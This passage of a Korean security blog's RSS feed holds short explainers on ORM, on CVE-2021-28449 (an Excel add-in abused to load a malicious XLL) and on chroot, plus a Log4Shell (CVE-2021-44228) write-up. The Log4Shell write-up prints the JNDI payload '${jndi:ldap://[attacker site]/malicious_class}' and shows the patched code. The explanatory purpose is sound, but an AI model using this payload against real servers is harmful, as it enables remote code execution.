&#xC561;&#xC138;&#xC2A4;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xADFC;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</li></ol><p>ORM(Object-Relational Mapping)&#xC740; &#xC704;&#xC758; &#xBAA8;&#xB4E0; &#xBD88;&#xC77C;&#xCE58;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xC194;&#xB8E8;&#xC158;&#xC73C;&#xB85C;, &#xAD00;&#xACC4;&#xD615; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC640; Java, C# &#xB4F1;&#xACFC; &#xAC19;&#xC740; &#xAC1D;&#xCCB4; &#xC9C0;&#xD5A5; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4; &#xAC04;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, SQL &#xB300;&#xC2E0; &#xC774;&#xC678;&#xC758; &#xAC1D;&#xCCB4; &#xC9C0;&#xD5A5; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> email = <span class="hljs-string">&apos;test@test.com&apos;</span>;</code></pre><pre><code class="hljs java"><span class="hljs-keyword">var</span> orm = require(<span class="hljs-string">&apos;generic-orm-libarry&apos;</span>);<span class="hljs-keyword">var</span> user = orm(<span class="hljs-string">&quot;users&quot;</span>).where({ email: <span class="hljs-string">&apos;test@test.com&apos;</span> });</code></pre><p>ORM &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xC885;&#xB958;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>JAVA : JPA, Hibernate, EclipseLink, DataNucleus, Ebean &#xB4F1;</li><li>C++ : ODB, QxOrm &#xB4F1;</li><li>Python : Django, SQLAlchemy, Storm &#xB4F1;</li><li>iOS : DatabaseObjects, Core Data &#xB4F1;</li><li>.NET : NHibernate, DatabaseObject, Dapper &#xB4F1;</li><li>PHP : Doctrine, Propel, RedBean &#xB4F1;</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/orm/">orm</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/15/y00n_nms/orm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-28449: A phishing document signed by Microsoft</title>
      <link>https://hackyboiz.github.io/2021/12/14/fabu1ous/2021-12-14/</link>
      <guid>https://hackyboiz.github.io/2021/12/14/fabu1ous/2021-12-14/</guid>
      <pubDate>Tue, 14 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://outflank.nl/blog/2021/12/09/a-phishing-document-s</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://outflank.nl/blog/2021/12/09/a-phishing-document-signed-by-microsoft/">A phishing document signed by Microsoft</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Excel</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft Excel&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB294; phishing document&#xB97C; &#xB9CC;&#xB4E4;&#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. MS Office &#xC124;&#xCE58; &#xD30C;&#xC77C;&#xC740; &#xC11C;&#xBA85;&#xB41C; Microsoft Analysis ToolPak Excel add-in&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xD574;&#xB2F9; XLAM add-in&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xCEE4;&#xB294; &#xC11C;&#xBA85;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAE68;&#xD2B8;&#xB9AC;&#xC9C0; &#xC54A;&#xACE0; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ATPVBAEN.XLAM&#xC740; ANAYS32.XLL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; export&#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. XLAM&#xC5D0;&#xB294; &#xC11C;&#xBA85;&#xB41C; VBA &#xCF54;&#xB4DC;&#xC640; Excel worksheet&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xB370;, Excel worksheet&#xC5D0;&#xB294;  XLL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD544;&#xC694;&#xD55C; <code>LibPath</code>&#xC640; <code>XLLName</code>&#xB4F1;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xD574;&#xCEE4;&#xAC00; &#xD574;&#xB2F9; Excel worksheet&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC5B4;&#xB5A0;&#xD55C; &#xC81C;&#xC57D;&#xC5C6;&#xC774; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6D0;&#xBCF8; XLAM&#xC744; &#xB2E4;&#xB978; &#xD3F4;&#xB354;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xB3D9;&#xC77C;&#xD55C; &#xC704;&#xCE58;&#xC5D0; ANALYS32.XLL&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xC545;&#xC131; XLL&#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xD568;&#xC218; <code>RegisterXLL</code>&#xC740; &#xC5B4;&#xB5A4; &#xACBD;&#xACE0;&#xB098; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC870;&#xC791;&#xB41C; <code>LibPath</code> &#xC640; <code>XLLName</code> &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xC545;&#xC131; XLL&#xD30C;&#xC77C;&#xC744; load &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/14/fabu1ous/2021-12-14/1.png" alt></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/injection/">injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/validation/">validation</category>
      
      <category domain="https://hackyboiz.github.io/tags/excel/">excel</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/14/fabu1ous/2021-12-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-44228: log4shell-전 세계 서버를 공격 가능한 최악의 log4j 취약점</title>
      <link>https://hackyboiz.github.io/2021/12/12/l0ch/2021-12-12/</link>
      <guid>https://hackyboiz.github.io/2021/12/12/l0ch/2021-12-12/</guid>
      <pubDate>Sun, 12 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10649&quot;&gt;https://xz.aliyun.com/t/10</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xz.aliyun.com/t/10649">https://xz.aliyun.com/t/10649</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Log4j 2.x &lt;= 2.15.0-rc1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>log4j&#xB294; &#xC804; &#xC138;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xAE30;&#xC788;&#xB294; logging library&#xB85C; Mincraft, Apple iCloud, Apache, Twitter, Steam, Amazon, Tesla &#xB4F1; &#xD604;&#xC7AC; &#xC218;&#xB9CE;&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; log4j&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; JNDI Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC774;&#xB984;&#xC740; log4shell&#xB85C; &#xBA85;&#xBA85;&#xB418;&#xC5C8;&#xC73C;&#xBA70; log4j&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB300;&#xBD80;&#xBD84;&#xC744; &#xACF5;&#xACA9; &#xAC00;&#xB2A5;&#xD55C; &#xB192;&#xC740; &#xD30C;&#xAE09;&#xB825;&#xACFC; &#xBE44;&#xAD50;&#xC801; &#xAC04;&#xB2E8;&#xD558;&#xB2E4;&#xB294; &#xC810; &#xB54C;&#xBB38;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC704;&#xD5D8;&#xC131;&#xC744; &#xD3C9;&#xAC00;&#xD558;&#xB294; &#xC9C0;&#xD45C;&#xC778; cvss &#xC810;&#xC218;&#xC758; &#xCD5C;&#xACE0;&#xC810; 10.0&#xC774; &#xBD80;&#xC5EC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. log4shell &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; <a href="https://github.com/YfryTchsGD/Log4jAttackSurface">&#xB9C1;&#xD06C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, 2021/12/12 &#xAE30;&#xC900; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3#diff-271353c1076e53f6893261e4420de27d34588bfd782806b5c66a3465c43b7f51">JndiManager.java</a> &#xC758; <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">JNDI lookup</a> &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>{        <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">this</span>.context.lookup(name);}</code></pre><p>JNDI(Java Naming and Directory Interface)&#xB294; &#xC790;&#xBC14; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; API&#xB85C;, &#xC6D0;&#xACA9;&#xC9C0; &#xC11C;&#xBC84;&#xC758; &#xAC1D;&#xCCB4;&#xB97C; &#xBC14;&#xC778;&#xB529;&#xD574; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC678;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC740; &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; LDAP(Lightweight Directory Access Protocol)&#xACFC; LDAPS(Secure LDAP)&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; lookup &#xAE30;&#xB2A5;&#xC758; name &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC5D0; <code>${jndi:ldap://[attacker site]/malicious_class}</code> &#xC640; &#xAC19;&#xC774; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xC758; &#xC545;&#xC131; &#xD074;&#xB798;&#xC2A4; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAC8C; &#xB418;&#xBA74; lookup&#xC740; <code>${}</code> &#xC548;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD30C;&#xC2F1;&#xD574; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; JNDI:LDAP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC678;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xC758; &#xC545;&#xC131; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xBC14;&#xC778;&#xB529;&#xD558;&#xAC8C; &#xB418;&#xACE0; &#xC545;&#xC131; &#xD074;&#xB798;&#xC2A4;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">String userInput = <span class="hljs-string">&quot;${jndi:ldap://[attacker site]/malicious_class}&quot;</span>;logger.info(<span class="hljs-string">&quot;log {} &quot;</span>, userInput)</code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xCDE8;&#xC57D;&#xD55C; &#xC11C;&#xBC84;&#xAC00; log4j&#xB97C; &#xD1B5;&#xD574; request&#xC640; &#xAC19;&#xC740; user input&#xC744; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p>JNDI&#xC640; JNDI Injection&#xC740; <a href="https://hackyboiz.github.io/2021/01/26/l0ch/2021-01-26/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2021-2109 : &#xC624;&#xB77C;&#xD074; Weblogic Server &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;</a>&#xC5D0;&#xC11C;&#xB3C4; &#xD65C;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xD328;&#xCE58;&#xB294; lookup&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; name&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBC0F; ldap &#xC11C;&#xBC84;, &#xD074;&#xB798;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xD544;&#xD130;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>{        <span class="hljs-keyword">try</span> {            URI uri = <span class="hljs-keyword">new</span> URI(name);            <span class="hljs-keyword">if</span> (uri.getScheme() != <span class="hljs-keyword">null</span>) {                <span class="hljs-keyword">if</span> (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {                    LOGGER.warn(<span class="hljs-string">&quot;Log4j JNDI does not allow protocol {}&quot;</span>, uri.getScheme());                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;                }                <span class="hljs-keyword">if</span> (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {                    <span class="hljs-keyword">if</span> (!allowedHosts.contains(uri.getHost())) {                        LOGGER.warn(<span class="hljs-string">&quot;Attempt to access ldap server not in allowed list&quot;</span>);                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;                    }                    Attributes attributes = <span class="hljs-keyword">this</span>.context.getAttributes(name);                    <span class="hljs-keyword">if</span> (attributes != <span class="hljs-keyword">null</span>) {                        <span class="hljs-comment">// In testing the &quot;key&quot; for attributes seems to be lowercase while the attribute id is</span>                        <span class="hljs-comment">// camelcase, but that may just be true for the test LDAP used here. This copies the Attributes</span>                        <span class="hljs-comment">// to a Map ignoring the &quot;key&quot; and using the Attribute&apos;s id as the key in the Map so it matches</span>                        <span class="hljs-comment">// the Java schema.</span>                        Map&lt;String, Attribute&gt; attributeMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();                        NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll();                        <span class="hljs-keyword">while</span> (enumeration.hasMore()) {                            Attribute attribute = enumeration.next();                            attributeMap.put(attribute.getID(), attribute);                        }                        Attribute classNameAttr = attributeMap.get(CLASS_NAME);                        <span class="hljs-keyword">if</span> (attributeMap.get(SERIALIZED_DATA) != <span class="hljs-keyword">null</span>) {                            <span class="hljs-keyword">if</span> (classNameAttr != <span class="hljs-keyword">null</span>) {                                String className = classNameAttr.get().toString();                                <span class="hljs-keyword">if</span> (!allowedClasses.contains(className)) {                                    LOGGER.warn(<span class="hljs-string">&quot;Deserialization of {} is not allowed&quot;</span>, className);                                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;                                }                            } <span class="hljs-keyword">else</span> {                                LOGGER.warn(<span class="hljs-string">&quot;No class name provided for {}&quot;</span>, name);                                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;                            }                        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attributeMap.get(REFERENCE_ADDRESS) != <span class="hljs-keyword">null</span>                                || attributeMap.get(OBJECT_FACTORY) != <span class="hljs-keyword">null</span>) {                            LOGGER.warn(<span class="hljs-string">&quot;Referenceable class is not allowed for {}&quot;</span>, name);                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;                        }                    }                }            }        } <span class="hljs-keyword">catch</span> (URISyntaxException ex) {            <span class="hljs-comment">// This is OK.</span></code></pre><p>&#xD574;&#xB2F9; &#xD328;&#xCE58;&#xC758; &#xCEE4;&#xBC0B;&#xB85C;&#xADF8;&#xB294; <a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3#">&#xB9C1;&#xD06C;</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a></p><p><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p><p><a href="https://github.com/YfryTchsGD/Log4jAttackSurface">https://github.com/YfryTchsGD/Log4jAttackSurface</a></p><p><a href="https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/">https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/</a></p><p><a href="https://isc.sans.edu/diary/rss/28120">https://isc.sans.edu/diary/rss/28120</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/java/">java</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/jndi-injection/">jndi injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/log4j/">log4j</category>
      
      <category domain="https://hackyboiz.github.io/tags/log4shell/">log4shell</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-44228/">cve-2021-44228</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/12/l0ch/2021-12-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Chroot</title>
      <link>https://hackyboiz.github.io/2021/12/10/poosic/chroot/</link>
      <guid>https://hackyboiz.github.io/2021/12/10/poosic/chroot/</guid>
      <pubDate>Fri, 10 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC720;&amp;#xB2C9;&amp;#xC2A4; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC5D0;&amp;#xC11C; chroot&amp;#xB294; &amp;#xD604;&amp;#xC7AC; &amp;#xC2E4;&amp;#xD589;&amp;#xC911;&amp;#xC778; &amp;#xD50</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC720;&#xB2C9;&#xC2A4; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; chroot&#xB294; &#xD604;&#xC7AC; &#xC2E4;&#xD589;&#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; root directory&#xB97C; &#xBCC0;&#xACBD;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; root directory&#xB85C; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC791;&#xC5C5;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC838; root directory&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xBA74; &#xC9C0;&#xC815;&#xB41C; directory tree&#xC678;&#xC758; &#xD30C;&#xC77C;&#xC740; &#xC9C0;&#xC815;&#xC774; &#xBD88;&#xAC00;&#xB2A5; &#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB807;&#xAC8C; &#xC2E4;&#xD589;&#xB41C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC744; directory tree&#xC678;&#xC758; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC10;&#xC625;&#xC5D0; &#xAC07;&#xD600;&#xC788;&#xB294; &#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD558;&#xB2E4;&#xACE0; &#xD574;&#xC11C; chroot jail&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><h2 id="Root-directory"><a href="#Root-directory" class="headerlink" title="Root directory"></a>Root directory</h2><p><img src="/2021/12/10/poosic/chroot/1.png" alt></p><p>&#xC6B0;&#xB9AC;&#xAC00; &#xD754;&#xD788; <code>cd /home/User/Desktop/...</code> &#xC640; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xB3C4; &#xB9E8; &#xC55E;&#xC5D0; &#x2018;<code>/</code>&#x2018;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xCC98;&#xB7FC; root directory&#xB294; &#xC720;&#xB2C9;&#xC2A4; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#x2018;<code>/</code>&#x2018;&#xB85C; &#xC4F0;&#xC5EC;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xBD80;&#xD130; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; root directory&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCD5C;&#xC0C1;&#xC704; &#xC704;&#xCE58;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.&#xC989;, &#xC0C1;&#xC704; directory&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xC0C1; &#xC704;&#xCE58;&#xB97C; root directory&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC791;&#xB3D9;-&#xBC29;&#xC2DD;"><a href="#&#xC791;&#xB3D9;-&#xBC29;&#xC2DD;" class="headerlink" title="&#xC791;&#xB3D9; &#xBC29;&#xC2DD;"></a>&#xC791;&#xB3D9; &#xBC29;&#xC2DD;</h2><p>chroot&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xD750;&#xB984;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800;, &#xC2DC;&#xC2A4;&#xD15C; &#xC0C1;&#xC5D0; &#xAC00;&#xC0C1;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC62C;&#xB77C;&#xAC04; &#xC0C1;&#xD669;&#xC744; &#xAC00;&#xC815;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/10/poosic/chroot/2.png" alt></p><p>&#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; root directory&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC5D0; &#xB300;&#xD574; &#xD0D0;&#xC0C9;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>FileA1</code>&#xC5D0; 